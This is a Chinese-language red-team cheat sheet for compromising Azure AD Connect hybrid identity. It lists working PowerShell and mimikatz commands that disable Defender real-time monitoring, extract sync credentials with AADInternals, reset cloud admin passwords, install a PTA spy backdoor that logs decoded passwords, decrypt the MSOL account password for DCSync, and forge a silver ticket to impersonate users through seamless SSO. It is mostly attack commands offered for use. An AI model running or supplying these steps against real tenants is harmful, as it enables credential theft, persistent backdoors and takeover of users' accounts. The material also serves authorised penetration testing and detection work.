  #### 检查是否安装了 Azure AD Connect：Get-ADSyncConnector

	对于PHS，我们可以提取凭证
	对于PTA，我们可以安装代理
	对于联合身份，我们可以使用 DA 从 ADFS 服务器提取证书
	PS > Set-MpPreference -DisableRealtimeMonitoring $true
	PS > Copy-Item -ToSession $adcnct -Path C:\Tools\AADInternals.0.4.5.zip -Destination C:\Users\Administrator\Documents
	PS > Expand-Archive C:\Users\Administrator\Documents\AADInternals.0.4.5.zip -DestinationPath C:\Users\Administrator\Documents\AADInternals
	PS > Import-Module C:\Users\Administrator\Documents\AADInternals\AADInternals.psd1
	PS > Get-AADIntSyncCredentials

	获取 SYNC 帐户的令牌并重置本地管理员密码
	PS > $passwd = ConvertToSecureString 'password' -AsPlainText -Force
	PS > $creds = New-Object System.Management.Automation.PSCredential ("<Username>@<TenantName>.onmicrosoft.com", $passwd)
	PS > GetAADIntAccessTokenForAADGraph -Credentials $creds –SaveToCache
	PS > Get-AADIntUser -UserPrincipalName onpremadmin@defcorpsecure.onmicrosoft.com | select ImmutableId
	PS > Set-AADIntUserPassword -SourceAnchor "<IMMUTABLE-ID>" -Password "Password" -Verbose

  #### 检查是否安装了 PTA：Get-Command -Module PassthroughAuthPSModule
	安装 PTA 后门
	PS AADInternals> Install-AADIntPTASpy
	PS AADInternals> Get-AADIntPTASpyLog -DecodePasswords

  #### Azure AD Connect - 密码提取
	AD Sync 中的凭据：C:\Program Files\Microsoft Azure AD Sync\Data\ADSync.mdf
工具 | 需要在目标上执行代码 | DLL 依赖项 | 本地需要 MSSQL | 本地需要python
--- | --- | --- | --- | ---
ADSyncDecrypt | 是 | 是 | 否 | 否
ADSyncGather | 是 | 否 | 否 | 是
ADSyncQuery | 否 (仅限网络 RPC 调用) | 否 | 是 | 是

	git clone https://github.com/fox-it/adconnectdump
  #### Azure AD Connect - MSOL 帐户的密码和 DCSync
  	可以使用 MSOL 帐户执行DCSync攻击
	要求：
	使用 Azure AD Connect 服务破坏服务器
	访问 ADSyncAdmins 或本地管理员组
	使用azuread_decrypt_msol.ps1来恢复 MSOL 帐户的解密密码：
	azuread_decrypt_msol.ps1: AD Connect 同步凭证提取 POC https://gist.github.com/xpn/0dc393e944d8733e3c63023968583545
	azuread_decrypt_msol_v2.ps1：更新了转储 Azure AD Connect Sync https://gist.github.com/xpn/f12b145dba16c2eebdd1c6829267b90c使用的 MSOL 服务帐户（允许 DCSync）的方法
	现在可以使用检索到的 MSOL 帐户凭据来发起 DCSync 攻击。
  #### Azure AD Connect - 银票上的无缝单点登录
  	任何可以编辑 AZUREADSSOACCS$ 帐户属性的人都可以使用 Kerberos 模拟 Azure AD 中的任何用户（如果没有 MFA）
	PHS 和 PTA 都支持无缝 SSO。如果启用无缝 SSO，则会在本地 AD 中创建计算机帐户AZUREADSSOC。
	AZUREADSSOACC 帐户的密码永远不会更改。
	使用https://autologon.microsoftazuread-sso.com/将 Kerberos 票证转换为 Office 365 和 Azure 的 SAML 和 JWT

	AZUREADSSOACC 帐户的 NTLM 密码哈希，例如f9969e088b2c13d93833d0ce436c76dd.
	mimikatz.exe "lsadump::dcsync /user:AZUREADSSOACC$" exit
	我们要模拟的用户的 AAD 登录名，例如elrond@contoso.com. 这通常是他的 userPrincipalName 或来自本地 AD 的邮件属性。
	我们要模拟的用户的 SID，例如S-1-5-21-2121516926-2695913149-3163778339-1234.
	创建 Silver Ticket 并将其注入 Kerberos 缓存：
	mimikatz.exe "kerberos::golden /user:elrond
	/sid:S-1-5-21-2121516926-2695913149-3163778339 /id:1234
	/domain:contoso.local /rc4:f9969e088b2c13d93833d0ce436c76dd
	/target:aadg.windows.net.nsatc.net /service:HTTP /ptt" exit
	启动 Mozilla Firefox
	转到 about:config 并将network.negotiate-auth.trusted-uris preference值设置为https://aadg.windows.net.nsatc.net,https://autologon.microsoftazuread-sso.com
	导航到与我们的 AAD 域集成的任何 Web 应用程序。填写用户名，同时将密码字段留空。